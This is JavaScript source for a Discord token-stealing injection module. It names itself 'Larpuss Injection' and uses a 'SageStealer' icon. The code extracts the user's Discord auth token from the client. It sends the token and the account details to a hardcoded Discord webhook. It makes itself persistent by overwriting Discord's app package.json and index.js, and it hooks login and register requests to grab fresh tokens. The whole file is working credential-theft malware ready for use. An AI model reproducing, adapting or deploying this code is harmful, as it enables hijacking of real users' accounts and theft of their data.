const { BrowserWindow, session } = require("electron");
const { execSync } = require("child_process");
const fs = require("fs");
const https = require("https");
const path = require("path");

const WEBHOOK = "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH";

const config = {
    embed: {
        color: 0xFFFFFF,
        author: {
            iconURL: "https://media.discordapp.net/attachments/1248748250815791115/1249415526141395105/SageStealer.png"
        }
    },
    emoji: {
        true: "<:circlecheck:1547393367967535144>",
        false: "<:circlex:1547393394848960573>",
        creditcard: "<:billcard:1547396408124903464>",
        paypal: "<:billpaypal:1547396440962105344>",
        token: "<:token:1547392684342116363>",
        badges: "<:badge:1547383027900874782>",
        billing: "<:billing:1547390172591693944>",
        friends: "<:uhqfriends:1547391814896713728>"
    }
};

const sendWebhook = (data) => {
    const payload = JSON.stringify(data);
    const options = {
        hostname: 'discord.com',
        port: 443,
        path: WEBHOOK.split('discord.com')[1],
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': payload.length
        }
    };
    
    const req = https.request(options);
    req.write(payload);
    req.end();
};

const getToken = () => {
    try {
        const script = `
        for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) 
        if (gg.c.hasOwnProperty(a)) { 
            let b = gg.c[a].exports; 
            if (b && b.__esModule && b.default) 
                for (let a in b.default) 
                    'getToken' == a && (token = b.default.getToken())
        } 
        token;`;
        return BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(script) || null;
    } catch { return null; }
};

const getUser = async (token) => {
    try {
        return new Promise((resolve) => {
            const data = JSON.stringify({});
            const options = {
                hostname: 'discord.com',
                path: '/api/v9/users/@me',
                method: 'GET',
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json'
                }
            };
            
            const req = https.request(options, (res) => {
                let body = '';
                res.on('data', chunk => body += chunk);
                res.on('end', () => {
                    try { resolve(JSON.parse(body)); }
                    catch { resolve(null); }
                });
            });
            
            req.on('error', () => resolve(null));
            req.end();
        });
    } catch { return null; }
};

const inject = async () => {
    try {
        const token = await getToken();
        if (!token) return;
        
        const user = await getUser(token);
        if (!user || !user.id) return;
        
        const embed = {
            color: config.embed.color,
            author: {
                name: `Larpuss Injection | ${user.username} (${user.id})`,
                icon_url: config.embed.author.iconURL
            },
            fields: [
                {
                    name: `${config.emoji.token} Token`,
                    value: `\`\`\`${token}\`\`\``,
                    inline: false
                },
                {
                    name: `${config.emoji.badges} User`,
                    value: `${user.username}#${user.discriminator}`,
                    inline: true
                }
            ],
            footer: { text: "t.me/larpuss" }
        };
        
        sendWebhook({ embeds: [embed] });
    } catch {}
};

// Auto-injection au démarrage Discord
const discord_path = (function() {
    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let resource = process.platform === "win32" ? 
        path.join(app, "resources") : 
        path.join(app, "Contents", "Resources");
    
    return fs.existsSync(resource) ? { resource, app } : { resource: null, app: null };
})();

const installInjection = () => {
    const { resource } = discord_path;
    if (!resource) return;
    
    const appPath = path.join(resource, "app");
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath, { recursive: true });
    
    const packagePath = path.join(appPath, "package.json");
    const indexPath = path.join(appPath, "index.js");
    
    if (fs.existsSync(packagePath)) fs.unlinkSync(packagePath);
    if (fs.existsSync(indexPath)) fs.unlinkSync(indexPath);
    
    fs.writeFileSync(packagePath, JSON.stringify({
        name: "discord",
        main: "index.js"
    }, null, 2));
    
    const injectionCode = fs.readFileSync(__filename, 'utf8');
    const indexCode = `
${injectionCode}
require('${path.join(resource, "app.asar").replace(/\\/g, "\\\\")}');
    `.trim();
    
    fs.writeFileSync(indexPath, indexCode);
};

// Session interceptors pour captures temps réel
session.defaultSession.webRequest.onCompleted({
    urls: ["*://discord.com/api/*/auth/login", "*://discord.com/api/*/auth/register"]
}, async (details) => {
    if (details.method === "POST" && details.statusCode === 200) {
        setTimeout(inject, 2000);
    }
});

// Démarrage
if (BrowserWindow.getAllWindows().length > 0) {
    setTimeout(inject, 3000);
}

installInjection();

try {
    module.exports = require("./core.asar");
} catch {
    // Fallback si core.asar n'existe pas
}
